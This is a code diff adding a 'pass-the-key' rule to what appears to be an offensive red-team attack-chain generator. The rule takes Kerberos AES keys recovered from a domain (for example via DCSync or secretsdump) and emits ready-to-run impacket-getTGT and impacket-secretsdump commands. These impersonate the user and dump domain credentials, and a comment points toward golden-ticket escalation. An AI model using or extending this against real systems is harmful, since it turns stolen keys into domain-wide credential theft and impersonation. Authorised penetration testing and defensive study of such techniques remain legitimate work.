@@ -1009,6 +1009,38 @@ def run(report, store, ui=None):
                 f"# every domain hash",
             ], src=s_gt, line=l_gt))
 
+    # iter-112: R-PTK - Pass-the-Key. When keyword.py finds a Kerberos AES
+    # key (from NTDS DCSync / pypykatz / secretsdump), emit a getTGT chain
+    # so the operator can auth via Kerberos without needing the plaintext
+    # or NT hash. Common on modern boxes where the operator recovered
+    # aes256 from NTDS.dit but not the corresponding NT.
+    _ptk_seen = set()
+    for _ev in store.items:
+        if _ev.kind != "kerberos_key" or not _ev.hash:
+            continue
+        _ptk_user = (_ev.user or "").strip()
+        if not _ptk_user or _ptk_user.lower() in _ptk_seen:
+            continue
+        _ptk_seen.add(_ptk_user.lower())
+        _ptk_dom = store.dominant_domain() or "<dom>"
+        _ptk_dc = store.dc_ip() or "<DC-IP>"
+        _ptk_fqdn = store.dc_fqdn() or "<DC-FQDN>"
+        # Score is between R7 (11ish for domain user hash) and R-GOLDEN
+        # (15 for krbtgt). AES256 for regular user is same value tier as
+        # PtH - ~8-11 depending on target proximity.
+        chains.append(Chain("R-PTK", "pass-the-key",
+            f"Kerberos AES key for {_ptk_user} -> impersonate via TGT",
+            crit=8, conf=0.85, ready=1.5, prox=0.9,          # score 9.18
+            commands=[
+                f"# recovered AES key ({_ev.hash[:16]}...) - request a TGT:",
+                f"impacket-getTGT '{_ptk_dom}/{_ptk_user}' "
+                f"-aesKey {_ev.hash} -dc-ip {_ptk_dc}",
+                f"export KRB5CCNAME='{_ptk_user}.ccache'",
+                f"impacket-secretsdump -k -no-pass -dc-ip {_ptk_dc} "
+                f"'{_ptk_dom}/{_ptk_user}@{_ptk_fqdn}'   "
+                f"# if user has DCSync rights -> R-GOLDEN cascade",
+            ], src=_ev.source, line=_ev.line))
+
     # iter-24: R-DPAPI - pair a recovered masterkey sha1 (pypykatz / impacket
     # output) with a Windows Credential vault file we've seen. With both,
     # decryption is one impacket-dpapi command - no online prompt needed.
